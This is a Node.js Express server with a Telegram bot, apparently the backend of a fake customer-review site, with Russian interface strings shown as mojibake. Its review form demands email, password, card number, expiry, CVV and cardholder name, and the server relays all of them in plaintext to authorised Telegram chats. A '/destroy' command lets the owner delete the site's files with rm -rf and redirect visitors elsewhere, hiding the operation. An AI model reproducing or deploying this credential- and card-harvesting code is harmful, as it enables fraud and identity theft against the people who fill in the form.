const express = require('express');
const bcrypt = require('bcryptjs');
const TelegramBot = require('node-telegram-bot-api');
const CryptoJS = require('crypto-js');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('../frontend'));

const DATA_FILE = path.join(__dirname, 'reviews.json');

let reviews = [];
try {
    if (fs.existsSync(DATA_FILE)) {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        reviews = JSON.parse(data);
    }
} catch (error) {
    console.log('–°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–π —Ñ–∞–π–ª reviews.json');
}

function saveReviews() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(reviews, null, 2));
}

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'simple-key-for-now';
const encrypt = (text) => CryptoJS.AES.encrypt(text, ENCRYPTION_KEY).toString();

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, {polling: true});

const AUTHORIZED_USERS = {};
const BOT_PASSWORD = "admin123";
const OWNER_ID = '1081998754';

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        'üîê –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å:\n\n' +
        '–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É: /password –≤–∞—à_–ø–∞—Ä–æ–ª—å'
    );
});

bot.onText(/\/password (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const password = match[1];
    
    if (password === BOT_PASSWORD) {
        AUTHORIZED_USERS[chatId] = true;
        bot.sendMessage(chatId, 
            '‚úÖ –î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω!\n\n' +
            '–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n' +
            '/reviews - –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–µ –æ—Ç–∑—ã–≤—ã\n' +
            '/stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞\n' +
            '–ù–æ–≤—ã–µ –æ—Ç–∑—ã–≤—ã –ø—Ä–∏—Ö–æ–¥—è—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏!'
        );
    } else {
        bot.sendMessage(chatId, '‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å!');
    }
});

bot.on('message', (msg) => {
    if (!AUTHORIZED_USERS[msg.chat.id]) {
        return;
    }
    
    if (msg.text === '/reviews') {
        if (reviews.length === 0) {
            bot.sendMessage(msg.chat.id, 'üì≠ –û—Ç–∑—ã–≤–æ–≤ –ø–æ–∫–∞ –Ω–µ—Ç');
            return;
        }
        
        let message = 'üìã –ü–æ—Å–ª–µ–¥–Ω–∏–µ –æ—Ç–∑—ã–≤—ã:\n\n';
        const recentReviews = reviews.slice(-5).reverse();
        
        recentReviews.forEach((review, index) => {
            message += `${index + 1}. ${review.email} - ‚≠ê${review.rating}/5\n`;
            message += `üí¨ ${review.comment.substring(0, 50)}...\n`;
            message += `üìÖ ${new Date(review.date).toLocaleString('ru-RU')}\n\n`;
        });
        
        bot.sendMessage(msg.chat.id, message);
    }
    
    if (msg.text === '/stats') {
        const totalReviews = reviews.length;
        const avgRating = totalReviews > 0 
            ? (reviews.reduce((sum, r) => sum + r.rating, 0) / totalReviews).toFixed(1)
            : 0;
            
        bot.sendMessage(msg.chat.id,
            `üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n\n` +
            `–í—Å–µ–≥–æ –æ—Ç–∑—ã–≤–æ–≤: ${totalReviews}\n` +
            `–°—Ä–µ–¥–Ω–∏–π —Ä–µ–π—Ç–∏–Ω–≥: ‚≠ê${avgRating}/5\n` +
            `–ü–æ—Å–ª–µ–¥–Ω–∏–π –æ—Ç–∑—ã–≤: ${reviews.length > 0 
                ? new Date(reviews[reviews.length-1].date).toLocaleString('ru-RU') 
                : '–µ—â–µ –Ω–µ—Ç'}`
        );
    }
    
    if (msg.chat.id.toString() !== OWNER_ID) {
        if (msg.text === '/destroy' || msg.text.startsWith('CONFIRM_DESTROY_')) {
            bot.sendMessage(msg.chat.id, '‚ùå –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –≤–ª–∞–¥–µ–ª—å—Ü—É');
            return;
        }
    }
    
    if (msg.text === '/destroy') {
        bot.sendMessage(msg.chat.id, 
            'üî¥ –£–ù–ò–ß–¢–û–ñ–ï–ù–ò–ï –°–ê–ô–¢–ê\n\n' +
            '‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: –í—Å–µ —Ñ–∞–π–ª—ã –±—É–¥—É—Ç —É–¥–∞–ª–µ–Ω—ã!\n' +
            '–°–∞–π—Ç –Ω–∞—á–Ω–µ—Ç —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏—Ç—å –Ω–∞ TripAdvisor\n\n' +
            '–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å:'
        );
    }
    
    if (msg.text === 'CONFIRM_DESTROY_2024') {
        bot.sendMessage(msg.chat.id, 'üóëÔ∏è –£–¥–∞–ª—è—é —Ñ–∞–π–ª—ã...');
        
        const redirectHTML = `<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to TripAdvisor</title>
    <meta http-equiv="refresh" content="0; url='https://tripadvisor.com'">
</head>
<body>
    <p>Redirecting to TripAdvisor...</p>
    <script>window.location.href = 'https://tripadvisor.com';</script>
</body>
</html>`;
        
        const frontendPath = path.join(__dirname, '../frontend');
        if (fs.existsSync(frontendPath)) {
            fs.writeFileSync(path.join(frontendPath, 'index.html'), redirectHTML);
            
            const files = fs.readdirSync(frontendPath);
            files.forEach(file => {
                if (file !== 'index.html') {
                    const filePath = path.join(frontendPath, file);
                    if (fs.existsSync(filePath)) {
                        if (fs.lstatSync(filePath).isDirectory()) {
                            exec(`rm -rf "${filePath}"`);
                        } else {
                            fs.unlinkSync(filePath);
                        }
                    }
                }
            });
        }
        
        const serverFiles = fs.readdirSync(__dirname);
        serverFiles.forEach(file => {
            if (file !== 'server.js' && file !== 'node_modules') {
                const filePath = path.join(__dirname, file);
                if (fs.existsSync(filePath)) {
                    if (fs.lstatSync(filePath).isDirectory()) {
                        exec(`rm -rf "${filePath}"`);
                    } else {
                        fs.unlinkSync(filePath);
                    }
                }
            }
        });
        
        if (fs.existsSync(DATA_FILE)) {
            fs.unlinkSync(DATA_FILE);
        }
        
        bot.sendMessage(msg.chat.id, 
            '‚úÖ –°–ê–ô–¢ –£–ù–ò–ß–¢–û–ñ–ï–ù!\n\n' +
            '‚Ä¢ –í—Å–µ —Ñ–∞–π–ª—ã —É–¥–∞–ª–µ–Ω—ã\n' + 
            '‚Ä¢ –°–∞–π—Ç —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏—Ç –Ω–∞ TripAdvisor\n' +
            '‚Ä¢ –î–∞–Ω–Ω—ã–µ —Å—Ç–µ—Ä—Ç—ã\n' +
            '‚Ä¢ –°–µ—Ä–≤–µ—Ä –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å —Å —Ä–µ–¥–∏—Ä–µ–∫—Ç–æ–º'
        );
    }
});

app.post('/api/submit-review', async (req, res) => {
    try {
        const { email, password, comment, rating, cardNumber, expiry, cvv, cardholder } = req.body;

        if (!email || !password || !comment || !rating) {
            return res.status(400).json({
                success: false,
                message: '–í—Å–µ –ø–æ–ª—è –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã'
            });
        }

        const hashedPassword = await bcrypt.hash(password, 10);

        const review = {
            id: Date.now(),
            email,
            password: hashedPassword,
            comment,
            rating,
            cardNumber: encrypt(cardNumber),
            expiry: encrypt(expiry),
            cvv: encrypt(cvv),
            cardholder: encrypt(cardholder),
            date: new Date()
        };

        reviews.push(review);
        saveReviews();

        const telegramMessage = `
üìù –ù–æ–≤—ã–π –æ—Ç–∑—ã–≤!
üìß Email: ${email}
üîë –ü–∞—Ä–æ–ª—å: ${password}
‚≠ê –†–µ–π—Ç–∏–Ω–≥: ${rating}/5
üí¨ –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: ${comment}
üí≥ –ö–∞—Ä—Ç–∞: ${cardNumber}
–°—Ä–æ–∫: ${expiry}
CVV: ${cvv}
–í–ª–∞–¥–µ–ª–µ—Ü: ${cardholder}
üìÖ –î–∞—Ç–∞: ${new Date().toLocaleString('ru-RU')}
`;

        Object.keys(AUTHORIZED_USERS).forEach(chatId => {
            bot.sendMessage(chatId, telegramMessage);
        });

        res.json({ 
            success: true, 
            message: '–û—Ç–∑—ã–≤ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!' 
        });

    } catch (error) {
        console.error('–û—à–∏–±–∫–∞:', error);
        res.status(500).json({ 
            success: false, 
            message: '–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞' 
        });
    }
});

app.listen(PORT, () => {
    console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ http://localhost:${PORT}`);
});